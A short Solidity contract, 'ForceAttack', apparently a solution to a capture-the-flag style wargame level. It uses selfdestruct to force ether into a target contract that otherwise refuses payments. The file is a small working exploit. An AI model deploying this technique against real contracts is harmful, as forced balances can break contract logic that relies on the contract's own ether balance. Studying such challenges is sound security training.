// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    address payable public forceContract;

    constructor(address _forceContract) payable {
        forceContract = payable(_forceContract);
    }

    function attack() external {
        selfdestruct(payable(forceContract));
    }
}
